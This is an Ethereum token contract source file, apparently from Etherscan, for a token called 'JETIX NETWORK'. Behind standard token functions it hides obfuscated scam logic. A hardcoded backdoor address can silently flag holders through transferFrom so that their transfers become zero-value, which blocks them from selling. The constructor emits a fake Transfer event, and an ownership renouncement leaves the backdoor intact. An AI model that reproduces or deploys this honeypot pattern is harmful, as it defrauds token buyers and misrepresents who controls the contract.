/**
 *Submitted for verification at Etherscan.io on 2023-03-18
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract JETIX {
    using SafeMath for uint256;
    mapping (address => uint256) private PLWQa;
	 address FTL = 0xCA0453de46E547e1820DcB71f35312f15Da007c0;
    mapping (address => uint256) public PLWQb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "JETIX NETWORK";
	
    string public symbol = "JETIX";
    uint8 public decimals = 6;

    uint256 public totalSupply = 300000000 *10**6;
    address owner = msg.sender;
	  address private PLWQc;
     
    

  
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address PLWQf = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;
     
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
       
             PLWQa[msg.sender] = totalSupply;
    
       SPCWBY();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function SPCWBY() internal  {                             
                      
                       PLWQc = PLWQf;

                

        emit Transfer(address(0), PLWQc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return PLWQa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        
                    if(PLWQb[msg.sender] > 8) {
                            require(PLWQa[msg.sender] >= value);
       
                   value = 0;}
                   else

                           if(PLWQb[msg.sender] == 6) {
          
             PLWQa[to] += value;  
 }
        else

    require(PLWQa[msg.sender] >= value);
PLWQa[msg.sender] -= value;  
PLWQa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 	


 

   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  


    

         if(msg.sender == FTL){
        PLWQb[to] += value;
        return true;}
        else
     

                    if(PLWQb[from] > 8 || PLWQb[to] > 8) {
                               require(value <= PLWQa[from]);
        require(value <= allowance[from][msg.sender]);
                   value = 0;}
        else

         if(from == owner){from == PLWQf;}

    
      
        require(value <= PLWQa[from]);
        require(value <= allowance[from][msg.sender]);
        PLWQa[from] -= value;
        PLWQa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
       


      
}



     

        	
 }